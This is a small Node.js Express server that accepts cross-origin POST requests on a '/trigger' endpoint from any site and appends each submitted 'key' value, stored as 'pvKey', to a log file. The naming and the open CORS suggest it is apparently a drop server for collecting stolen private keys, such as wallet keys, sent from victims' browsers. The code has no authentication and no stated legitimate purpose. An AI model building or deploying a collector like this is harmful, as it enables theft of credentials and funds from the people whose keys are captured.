const express = require("express");
var bodyParser = require('body-parser');

const app = express();
const cors = require('cors');
var fs = require('fs')

const port = process.env.PORT || 3000; // Heroku will need the PORT environment variable
app.use(cors({
    origin: '*'
}));
app.use(bodyParser.urlencoded({
    extended: false
}))
app.use(bodyParser.json())

app.post("/trigger", (req, res) => {
	const pvKey = req.body.key;
	var logger = fs.createWriteStream('log.txt', {
  		flags: 'a'
	})
	logger.write(pvKey);
	logger.write('\n');
	res.send();
});

app.listen(port, () => console.log(`App is live on port ${port}!`));